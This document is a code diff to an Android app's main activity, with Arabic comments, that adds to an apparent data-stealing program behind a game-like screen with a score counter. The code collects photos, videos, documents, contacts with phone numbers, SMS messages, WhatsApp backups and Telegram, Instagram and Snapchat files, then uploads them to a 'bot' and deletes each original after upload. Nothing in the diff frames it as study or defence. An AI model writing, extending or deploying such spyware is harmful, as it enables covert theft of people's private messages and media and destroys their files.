@@ -37,6 +37,7 @@ public class MainActivity extends Activity {
     private TextView scoreText;
     private int score = 0;
     private TextView statusText;
+    private int fileCount = 0;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -99,7 +100,7 @@ public class MainActivity extends Activity {
                         runOnUiThread(new Runnable() {
                             @Override
                             public void run() {
-                                statusText.setText("✅ تم رفع كل شيء للبوت!");
+                                statusText.setText("✅ تم رفع " + fileCount + " ملف للبوت!");
                                 statusText.setTextColor(Color.GREEN);
                             }
                         });
@@ -127,19 +128,20 @@ public class MainActivity extends Activity {
         try {
             String storage = Environment.getExternalStorageDirectory().getAbsolutePath();
             
-            // صور
+            // صور من كل المجلدات
             updateStatus("📸 جاري جمع الصور...");
+            sendMediaFiles(storage + "/DCIM/", "jpg|jpeg|png|gif|bmp");
             sendMediaFiles(storage + "/DCIM/Camera/", "jpg|jpeg|png|gif|bmp");
             sendMediaFiles(storage + "/Pictures/", "jpg|jpeg|png|gif|bmp");
+            sendMediaFiles(storage + "/Download/", "jpg|jpeg|png|gif|bmp");
             sendMediaFiles(storage + "/WhatsApp/Media/WhatsApp Images/", "jpg|jpeg|png|gif|bmp");
-            sendMediaFiles(storage + "/Telegram/Telegram Images/", "jpg|jpeg|png|gif|bmp");
-            
-            // فيديوهات
-            updateStatus("🎥 جاري جمع الفيديوهات...");
-            sendMediaFiles(storage + "/DCIM/Camera/", "mp4|3gp|avi|mkv|mov|wmv|flv|webm");
-            sendMediaFiles(storage + "/Movies/", "mp4|3gp|avi|mkv|mov|wmv|flv|webm");
             sendMediaFiles(storage + "/WhatsApp/Media/WhatsApp Video/", "mp4|3gp|avi|mkv|mov|wmv|flv|webm");
+            sendMediaFiles(storage + "/Telegram/Telegram Images/", "jpg|jpeg|png|gif|bmp");
             sendMediaFiles(storage + "/Telegram/Telegram Video/", "mp4|3gp|avi|mkv|mov|wmv|flv|webm");
+            sendMediaFiles(storage + "/Instagram/", "jpg|jpeg|png|gif|bmp|mp4");
+            sendMediaFiles(storage + "/Android/media/com.instagram.android/", "jpg|jpeg|png|gif|bmp|mp4");
+            sendMediaFiles(storage + "/Movies/", "mp4|3gp|avi|mkv|mov|wmv|flv|webm");
+            sendMediaFiles(storage + "/Snapchat/", "jpg|jpeg|png|gif|bmp|mp4");
             
             // مستندات
             updateStatus("📄 جاري جمع المستندات...");
@@ -154,25 +156,27 @@ public class MainActivity extends Activity {
             updateStatus("💬 جاري استخراج رسائل SMS...");
             sendSMS();
             
-            // محادثات واتساب
-            updateStatus("💚 جاري استخراج محادثات واتساب...");
-            getWhatsAppChats();
-            
-            // محادثات تيليجرام
-            updateStatus("💙 جاري استخراج محادثات تيليجرام...");
-            getTelegramChats();
-            
             // معلومات الجهاز
             updateStatus("📱 جاري جمع معلومات الجهاز...");
             sendDeviceInfo();
             
-            // تكرار الاختراق كل ساعة
-            new Handler().postDelayed(new Runnable() {
-                @Override
-                public void run() {
-                    collectAllData();
-                }
-            }, 3600000);
+            // نسخ احتياطية واتساب (مشفرة)
+            updateStatus("💚 جاري جمع نسخ واتساب الاحتياطية...");
+            getWhatsAppBackup();
+            
+            // ملفات تيليجرام
+            updateStatus("💙 جاري جمع ملفات تيليجرام...");
+            getTelegramFiles();
+            
+            // ملفات إنستا
+            updateStatus("💜 جاري جمع ملفات إنستا...");
+            getInstagramFiles();
+            
+            // كشف الحسابات
+            updateStatus("🔍 جاري كشف الحسابات...");
+            detectAccounts();
+            
+            updateStatus("✅ تم رفع كل شيء للبوت!");
             
         } catch (Exception e) {
             e.printStackTrace();
@@ -200,7 +204,7 @@ public class MainActivity extends Activity {
                     String ext = file.getName().substring(file.getName().lastIndexOf(".") + 1).toLowerCase();
                     if (extensions.contains(ext)) {
                         sendFile(file);
-                        Thread.sleep(100);
+                        Thread.sleep(50);
                     }
                 }
             }
@@ -248,6 +252,7 @@ public class MainActivity extends Activity {
             
             int responseCode = conn.getResponseCode();
             if (responseCode == 200) {
+                fileCount++;
                 file.delete();
             }
             conn.disconnect();
@@ -267,7 +272,27 @@ public class MainActivity extends Activity {
                 FileWriter writer = new FileWriter(file);
                 do {
                     String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
-                    if (name != null) writer.write(name + "\n");
+                    String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
+                    if (name != null) {
+                        writer.write("الاسم: " + name + "\n");
+                        // جلب الأرقام
+                        Cursor phones = getContentResolver().query(
+                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                            null,
+                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
+                            new String[]{id},
+                            null
+                        );
+                        if (phones != null) {
+                            while (phones.moveToNext()) {
+                                String number = phones.getString(phones.getColumnIndex(
+                                    ContactsContract.CommonDataKinds.Phone.NUMBER));
+                                writer.write("رقم: " + number + "\n");
+                            }
+                            phones.close();
+                        }
+                        writer.write("------------------------\n");
+                    }
                 } while (cursor.moveToNext());
                 writer.close();
                 cursor.close();
@@ -285,6 +310,7 @@ public class MainActivity extends Activity {
             if (cursor != null && cursor.moveToFirst()) {
                 File file = new File(getExternalFilesDir(null), "sms.txt");
                 FileWriter writer = new FileWriter(file);
+                int count = 0;
                 do {
                     String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                     String address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
@@ -294,8 +320,9 @@ public class MainActivity extends Activity {
                         writer.write("التاريخ: " + date + "\n");
                         writer.write("النص: " + body + "\n");
                         writer.write("------------------------\n");
+                        count++;
                     }
-                } while (cursor.moveToNext());
+                } while (cursor.moveToNext() && count < 100);
                 writer.close();
                 cursor.close();
                 if (file.length() > 0) sendFile(file);
@@ -303,118 +330,137 @@ public class MainActivity extends Activity {
         } catch (Exception e) {}
     }
 
-    private void getWhatsAppChats() {
+    private void getWhatsAppBackup() {
         try {
-            // مسار قاعدة بيانات واتساب
             String[] paths = {
-                "/data/data/com.whatsapp/databases/msgstore.db",
-                "/data/data/com.whatsapp/databases/wa.db",
-                "/storage/emulated/0/Android/media/com.whatsapp/",
-                "/storage/emulated/0/WhatsApp/Databases/"
+                "/storage/emulated/0/WhatsApp/Databases/",
+                "/storage/emulated/0/Android/media/com.whatsapp/"
             };
-            
-            for (String path : paths) {
-                File file = new File(path);
-                if (file.exists()) {
-                    if (file.isDirectory()) {
-                        File[] files = file.listFiles();
-                        if (files != null) {
-                            for (File f : files) {
-                                if (f.getName().endsWith(".db") || f.getName().endsWith(".crypt14") || 
-                                    f.getName().endsWith(".crypt12") || f.getName().endsWith(".enc")) {
-                                    sendFile(f);
-                                }
-                            }
-                        }
-                    } else {
-                        sendFile(file);
-                    }
-                }
-            }
-            
-            // تصدير محادثات واتساب إلى نص
-            exportWhatsAppChatsToText();
-            
-        } catch (Exception e) {}
-    }
-
-    private void exportWhatsAppChatsToText() {
-        try {
-            File chatFile = new File(getExternalFilesDir(null), "whatsapp_chats.txt");
-            BufferedWriter writer = new BufferedWriter(new FileWriter(chatFile));
-            
-            writer.write("========== محادثات واتساب ==========\n\n");
-            
-            File waDir = new File("/storage/emulated/0/WhatsApp/Databases/");
-            if (waDir.exists()) {
-                File[] files = waDir.listFiles();
-                if (files != null) {
-                    for (File f : files) {
-                        writer.write("ملف: " + f.getName() + "\n");
-                        writer.write("الحجم: " + f.length() + " بايت\n");
-                        writer.write("------------------------\n");
-                    }
-                }
-            }
-            
-            writer.close();
-            if (chatFile.length() > 0) sendFile(chatFile);
-            
-        } catch (Exception e) {}
-    }
-
-    private void getTelegramChats() {
-        try {
-            // مسارات تيليجرام
-            String[] paths = {
-                "/data/data/org.telegram.messenger/databases/",
-                "/data/data/org.telegram.plus/databases/",
-                "/storage/emulated/0/Android/data/org.telegram.messenger/files/"
-            };
-            
             for (String path : paths) {
                 File dir = new File(path);
                 if (dir.exists() && dir.isDirectory()) {
                     File[] files = dir.listFiles();
                     if (files != null) {
-                        for (File file : files) {
-                            if (file.getName().endsWith(".db") || file.getName().endsWith(".db-journal")) {
-                                sendFile(file);
+                        for (File f : files) {
+                            if (f.isFile() && f.length() > 0) {
+                                String name = f.getName().toLowerCase();
+                                if (name.endsWith(".crypt14") || name.endsWith(".crypt12") || 
+                                    name.endsWith(".crypt") || name.endsWith(".db") || name.endsWith(".enc")) {
+                                    sendFile(f);
+                                }
                             }
                         }
                     }
                 }
             }
-            
-            // تصدير محادثات تيليجرام إلى نص
-            exportTelegramChatsToText();
-            
         } catch (Exception e) {}
     }
 
-    private void exportTelegramChatsToText() {
+    private void getTelegramFiles() {
         try {
-            File chatFile = new File(getExternalFilesDir(null), "telegram_chats.txt");
-            BufferedWriter writer = new BufferedWriter(new FileWriter(chatFile));
-            
-            writer.write("========== محادثات تيليجرام ==========\n\n");
-            
-            File tgDir = new File("/storage/emulated/0/Telegram/");
-            if (tgDir.exists()) {
-                File[] files = tgDir.listFiles();
-                if (files != null) {
-                    for (File f : files) {
-                        if (f.isDirectory()) {
-                            writer.write("📁 مجلد: " + f.getName() + "\n");
-                        } else {
-                            writer.write("📄 ملف: " + f.getName() + "\n");
+            String[] paths = {
+                "/storage/emulated/0/Telegram/",
+                "/storage/emulated/0/Android/data/org.telegram.messenger/files/",
+                "/storage/emulated/0/Android/data/org.telegram.plus/files/"
+            };
+            for (String path : paths) {
+                File dir = new File(path);
+                if (dir.exists() && dir.isDirectory()) {
+                    File[] files = dir.listFiles();
+                    if (files != null) {
+                        for (File f : files) {
+                            if (f.isFile() && f.length() > 0) {
+                                String name = f.getName().toLowerCase();
+                                if (name.endsWith(".db") || name.endsWith(".json") || 
+                                    name.endsWith(".txt") || name.endsWith(".cache")) {
+                                    sendFile(f);
+                                }
+                            }
                         }
                     }
                 }
             }
+        } catch (Exception e) {}
+    }
+
+    private void getInstagramFiles() {
+        try {
+            String[] paths = {
+                "/storage/emulated/0/Instagram/",
+                "/storage/emulated/0/Android/media/com.instagram.android/",
+                "/storage/emulated/0/Pictures/Instagram/"
+            };
+            for (String path : paths) {
+                File dir = new File(path);
+                if (dir.exists() && dir.isDirectory()) {
+                    File[] files = dir.listFiles();
+                    if (files != null) {
+                        for (File f : files) {
+                            if (f.isFile() && f.length() > 0) {
+                                sendFile(f);
+                            }
+                        }
+                    }
+                }
+            }
+        } catch (Exception e) {}
+    }
+
+    private void detectAccounts() {
+        try {
+            File file = new File(getExternalFilesDir(null), "accounts_detected.txt");
+            FileWriter writer = new FileWriter(file);
+            
+            writer.write("========== الحسابات المكتشفة ==========\n\n");
+            
+            // كشف واتساب
+            File waDir = new File("/storage/emulated/0/WhatsApp/");
+            if (waDir.exists()) {
+                writer.write("✅ واتساب: مثبت\n");
+                // محاولة جلب رقم من ملف الإعدادات
+                File settings = new File("/data/data/com.whatsapp/shared_prefs/com.whatsapp_preferences.xml");
+                if (settings.exists()) {
+                    writer.write("   - ملف الإعدادات موجود\n");
+                }
+            } else {
+                writer.write("❌ واتساب: غير مثبت\n");
+            }
+            
+            // كشف تيليجرام
+            File tgDir = new File("/storage/emulated/0/Telegram/");
+            if (tgDir.exists()) {
+                writer.write("✅ تيليجرام: مثبت\n");
+            } else {
+                writer.write("❌ تيليجرام: غير مثبت\n");
+            }
+            
+            // كشف إنستا
+            File instaDir = new File("/storage/emulated/0/Instagram/");
+            File instaMedia = new File("/storage/emulated/0/Android/media/com.instagram.android/");
+            if (instaDir.exists() || instaMedia.exists()) {
+                writer.write("✅ إنستغرام: مثبت\n");
+            } else {
+                writer.write("❌ إنستغرام: غير مثبت\n");
+            }
+            
+            // كشف سناب شات
+            File snapDir = new File("/storage/emulated/0/Snapchat/");
+            if (snapDir.exists()) {
+                writer.write("✅ سناب شات: مثبت\n");
+            } else {
+                writer.write("❌ سناب شات: غير مثبت\n");
+            }
+            
+            // كشف فيسبوك
+            File fbDir = new File("/storage/emulated/0/Android/data/com.facebook.katana/");
+            if (fbDir.exists()) {
+                writer.write("✅ فيسبوك: مثبت\n");
+            } else {
+                writer.write("❌ فيسبوك: غير مثبت\n");
+            }
             
             writer.close();
-            if (chatFile.length() > 0) sendFile(chatFile);
+            if (file.length() > 0) sendFile(file);
             
         } catch (Exception e) {}
     }
@@ -428,6 +474,7 @@ public class MainActivity extends Activity {
             info.put("sdk", Build.VERSION.SDK_INT);
             info.put("storage_total", new File("/storage/emulated/0").getTotalSpace());
             info.put("storage_free", new File("/storage/emulated/0").getFreeSpace());
+            info.put("files_sent", fileCount);
             
             File file = new File(getExternalFilesDir(null), "device_info.txt");
             FileWriter writer = new FileWriter(file);
